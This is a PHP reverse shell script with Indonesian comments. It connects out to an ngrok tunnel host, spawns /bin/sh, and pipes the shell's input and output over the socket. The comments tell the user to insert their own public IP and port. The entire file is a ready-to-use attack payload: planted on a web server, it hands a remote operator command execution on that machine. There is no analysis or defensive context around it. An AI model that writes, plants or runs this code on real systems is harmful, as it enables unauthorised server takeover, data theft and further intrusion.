<?php
// IP dan port untuk koneksi balik
$ip = '0.tcp.ap.ngrok.io:13347'; // Ganti dengan IP publik Anda
$port = 2323; // Ganti dengan port Anda

// Membuka koneksi ke IP dan port
$sock = fsockopen($ip, $port);
if (!$sock) {
    die("Gagal membuat koneksi.");
}

// Menghubungkan shell ke socket
$descriptorspec = array(
    0 => array("pipe", "r"), // STDIN
    1 => array("pipe", "w"), // STDOUT
    2 => array("pipe", "w")  // STDERR
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    while (!feof($sock)) {
        $data = fgets($sock);
        if ($data) {
            fwrite($pipes[0], $data);
        }
        $output = stream_get_contents($pipes[1]);
        if ($output) {
            fwrite($sock, $output);
        }
        $error = stream_get_contents($pipes[2]);
        if ($error) {
            fwrite($sock, $error);
        }
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
fclose($sock);
?>
